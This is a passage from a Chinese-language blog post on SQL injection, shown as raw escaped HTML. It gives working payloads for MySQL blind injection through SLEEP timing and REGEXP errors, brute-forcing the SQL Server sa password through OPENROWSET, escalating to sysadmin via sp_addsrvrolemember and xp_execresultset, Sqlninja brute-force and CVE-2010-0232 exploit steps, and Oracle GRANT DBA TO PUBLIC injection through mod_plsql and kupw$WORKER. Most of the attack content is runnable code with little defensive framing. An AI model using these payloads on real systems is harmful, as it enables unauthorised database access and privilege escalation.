&lt;span class=&#34;token string&#34;&gt;&#39;|| SELECT (SELECT CASE WHEN @@version LIKE &#39;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5.1&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39; THEN SLEEP(5) ELSE &#39;&lt;/span&gt;somevalue&lt;span class=&#34;token string&#34;&gt;&#39; END FROM ((SELECT &#39;&lt;/span&gt;valuel&lt;span class=&#34;token string&#34;&gt;&#39; AS foobar) UNION (SELECT &#39;&lt;/span&gt;value2&lt;span class=&#34;token string&#34;&gt;&#39; AS foobar)) ALIAS) ||&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 拼接后&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CASE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; @&lt;span class=&#34;token variable&#34;&gt;@version&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;5.1.56%&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; SLEEP&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ELSE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;somevalue&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;valuel&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; foobar&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;value2&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; foobar&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; ALIAS&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;REGEXP操作符&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;REGEXP&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;CASE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;WHEN&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;condition&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;THEN&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;.*&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;ELSE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;*&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;fool&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; bar&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;UNION&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;foo2&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; bar&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; foobar&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果条件(condition)为true, CASE子句将使用有效的正则表达式它将向最外层的 SELECT语句返回两行数据，我们将接收到常见的错误：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;ERROR &lt;span class=&#34;token number&#34;&gt;1242&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;21000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;: Subquery returns &lt;span class=&#34;token function&#34;&gt;more&lt;/span&gt; than &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; row&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;如果条件为false, REGEXP将采用作为参数，它并不是一个有效的正则表达式， 在这种情况下数据库服务器将返回下列错误：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;ERROR &lt;span class=&#34;token number&#34;&gt;1139&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;42000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token builtin class-name&#34;&gt;:&lt;/span&gt; Got error &lt;span class=&#34;token string&#34;&gt;&#39;repetition-operator operand invalid&#39;&lt;/span&gt; from regexp&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;其他&#34;&gt;&lt;a href=&#34;#其他&#34; class=&#34;headerlink&#34; title=&#34;其他&#34;&gt;&lt;/a&gt;其他&lt;/h4&gt;&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;http:&lt;span class=&#34;token comment&#34;&gt;//test/?name=&#39;;INSERT+INTO+users(id,pass,privs)+VALUES+(&#39;test&#39;,&#39;test&#39;,0)-- &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;提升权限&#34;&gt;&lt;a href=&#34;#提升权限&#34; class=&#34;headerlink&#34; title=&#34;提升权限&#34;&gt;&lt;/a&gt;提升权限&lt;/h3&gt;&lt;p&gt;由于对普通用户存在着限制，要想充分发挥前面介绍的几种攻击的潜力，就必须获取管理员访问权。&lt;/p&gt;
&lt;h4 id=&#34;SQL-Server-1&#34;&gt;&lt;a href=&#34;#SQL-Server-1&#34; class=&#34;headerlink&#34; title=&#34;SQL Server&#34;&gt;&lt;/a&gt;SQL Server&lt;/h4&gt;&lt;p&gt;&lt;code&gt;OPENROWSET&lt;/code&gt;作用于SQL Server上，实现对远程OLE DB数据源(例如另一个SQL Server数据库)的一次性连接。DBA可用它来检索远程数据库上的数据，以此作为永久连接(link)两个数 据库的一种手段。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OPENROWSET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SQLOLEDB&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Network=DBMSSOCN; Address=10.0.2.2;uid=foo;pwd=password&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SELECT columnl FROM tableA&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上述语句中以用户foo连接到地址为10.0.2.2的SQL Server并执行&lt;code&gt;select column1 from tableA&lt;/code&gt;查询，最外层的查询传递并返回该查询的结果。foo是地址为10.0.2.2的数据库的一个用户，而不是首次执行OPENROWSET时的数据库用户。&lt;/p&gt;
&lt;p&gt;openrowset可以用来爆破sa提权，有三个要点&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;OPENROWSET必须提供执行连接的数据库上的有效凭证。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;OPENROWSET不仅可用于连接远程数据库，还可用于执行本地连接；执行本地连接时，使用用户在OPENROWSET调用中指定的权限。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在SQL Server 2000上，所有用户均可调用OPENROWSET;而在SQL Server 2005和 2008上，默认情况下该操作被禁用。但有时会被DBA重新启用&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;openrowset至少返回一行，所以加个在没有其他会显示是，必须加个&lt;code&gt;select 1&lt;/code&gt;，当然也能加其他的&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- 爆破sa口令&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OPENROWSET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SQLOLEDB&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Network=DBMSSOCN;Address=;uid=sa; pwd=foo&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;select 1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;foo是口令的话返回1，不正确返回&lt;code&gt;Login failed for user &#39;sa&#39;.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果找到了sa口令，可以使用&lt;code&gt;sp_addsrvrolemember&lt;/code&gt;储存过程将用户添加至sysadmin组，这样就能提升权限&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OPENROWSET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SQLOLEDB&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Network=DBMSSOCN;
Address=;uid=sa;pwd=password&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SELECT 1; EXEC
master.dbo.sp_addsrvrolemeniber &#34;appdbuser&#34;,&#34;sysadmin&#34;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 两个参数appdbuser是用户名，第二个是组名&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;注入一个完整的过程，首先构造一个包含OPENROWSET查询和正确用户名的字符串@q，然后通过将@q传递给xp execresultset扩展存储过程（在SQL Server 2000上，所有用户均可调用它）来执行该查询。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@q&lt;/span&gt; nvarchar&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;999&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;SET&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@q&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; N&lt;span class=&#34;token string&#34;&gt;&#39;SELECT 1 FROM OPENROWSET（&#34;SQLOLEDB&#34;,&#34;Network=DBMSSOCN; Address=;uid=sa;pwd=password&#34;,&#34;SELECT 1; EXEC master.dbo.sp_addsrvrolemember &#39;&lt;/span&gt;&#34;&lt;span class=&#34;token string&#34;&gt;&#34;+system_user+&#34;&#34;&#39;,&#34;&#34;sysadmin&#34;&lt;/span&gt;&#34;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;;

EXEC master.dbo.xp_execresultset @q, N&#39;&lt;/span&gt;master&#39;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;只有目标SQL server启用了混合验证模式，sa才能工作，使用混合验证模式时，Windows用户和SQL Server用户（比如sa）均可通过数据库验证。如果远程数据库服务器上配置的只有Windows验证模式，那么此时只有Windows用户能够访问数据库，sa账户将不可用。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- 检测当前使用的哪种模式&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; serverproperty&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;IslntegratedSecurityOnly&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;-- 如果当前采用的只有Windows验证模式，那么该查询返回1，否则返回0&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sqlninja暴力破解命令&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-bash&#34; data-language=&#34;bash&#34;&gt;&lt;code class=&#34;language-bash&#34;&gt;./sqlninj a &lt;span class=&#34;token parameter variable&#34;&gt;-m&lt;/span&gt; bruteforce &lt;span class=&#34;token parameter variable&#34;&gt;-w&lt;/span&gt; wordlist.txt
./sqlninj a &lt;span class=&#34;token parameter variable&#34;&gt;-m&lt;/span&gt; fingerprint&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;OPENROWSET 还可用于寻找存在弱口令的SQL Server&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;OPENROWSET&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SQLOLEDB&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;Network=DBMSSOCN;
Address=10.0.0.1;uid=sa; pwd=&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;SELECT 1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;-- 测试openrowset是否可用&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; value_in_use &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;configurations &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;LIKE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Ad Hoc%&#39;&lt;/span&gt; 
&lt;span class=&#34;token comment&#34;&gt;-- 如果OPENROWSET可用，该查询将返回1，否则将返回0。 &lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;在未打补丁的服务器上提升权限&#34;&gt;&lt;a href=&#34;#在未打补丁的服务器上提升权限&#34; class=&#34;headerlink&#34; title=&#34;在未打补丁的服务器上提升权限&#34;&gt;&lt;/a&gt;在未打补丁的服务器上提升权限&lt;/h4&gt;&lt;p&gt;如果目标数据库服务器没有更新最新的安全补丁，它就可能会受到一种或多种很有名的攻击。&lt;/p&gt;
&lt;p&gt;例子：CVE-2010-0232漏洞&lt;/p&gt;
&lt;p&gt;Sqlninja中包含了一个利用该原始漏洞的定制版本的工具。当以sql作为参数来调用该工具时， 它将寻找SQLSERVR.EXE进程并将该进程的权限提升为SYSTEM。为了执行这种攻击，需要 执行下面几个步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;使用 fingerprint 模式(-m fingerprint)检查 xp cmdshell 是否可用(option 3),以及 SQLSERVR. EXE并未以SYSTEM权限运行(option 5)。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;使用 upload 模式(-m upload)将 vdmallowed.exe(option 5)和 vdmexploit.dll(叩tion 6)传送到远程服务器。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;使用 command 模式(-m command)运行 ‘&lt;code&gt;％TEMP%\\vdmallowed.exe sql&lt;/code&gt;， 以执行该漏洞利用工具。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果远程Windows服务器没有打上针对这一漏洞的补丁，此时fingerprint模式将确认SQL Server真正运行在SYSTEM权限之下。&lt;/p&gt;
&lt;h5 id=&#34;Oracle-1&#34;&gt;&lt;a href=&#34;#Oracle-1&#34; class=&#34;headerlink&#34; title=&#34;Oracle&#34;&gt;&lt;/a&gt;Oracle&lt;/h5&gt;&lt;p&gt;如果我们可以访问&lt;code&gt;dbms_xmlquery.newcontext()&lt;/code&gt;或&lt;code&gt;dbms_xmlquery.getxml()&lt;/code&gt;(默认对于PUBLIC权限可访问)，就可以通过匿名PL/SQL代码块执行注入&lt;/p&gt;
&lt;p&gt;不需要PL/SQL注入的一个例子是：使用在Oracle的mod_plsql组件中发现的一个漏洞。 下列URL展示了一种通过driload包提升权限的方法。这个包未被mod_plsql组件过滤，所有Web用户均可通过输入下列URL来提升权限：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.victim.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=GRANT+DBA+TO+PUBLIC&#34;&gt;http://www.victim.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=GRANT+DBA+TO+PUBLIC&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在利用大多数权限提升漏洞时使用了下列概念：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;创建一个将DBA权限授权给公共角色的有效载荷。这比将DBA权限授权给指定的用户更隐蔽些。下一步将把该有效载荷注入一个易受攻击的PL/SQL存储过程中。&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;REPLACE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FUNCTION&lt;/span&gt; F1 &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; number
authid &lt;span class=&#34;token keyword&#34;&gt;current_user&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt;
pragma autonomous_transaction&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXECUTE&lt;/span&gt; IMMEDIATE &lt;span class=&#34;token string&#34;&gt;&#39;GRANT DBA TO PUBLIC&#39;&lt;/span&gt;；
&lt;span class=&#34;token keyword&#34;&gt;COMMIT&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;RETURN&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将该有效载荷注入一个易受攻击的包中：&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;exec&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;kupw$WORKER&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;x&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;YY&#39;&#39; and 1=user12.f1 -- mytagl2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;启用DBA角色：&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;set&lt;/span&gt; role DBA&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;从公共角色中撤销DBA角色：&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;revoke&lt;/span&gt; DBA &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;PUBLIC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;当前会话虽然仍然拥有DBA权限，但却不再出现在Oracle的权限表中。&lt;/p&gt;
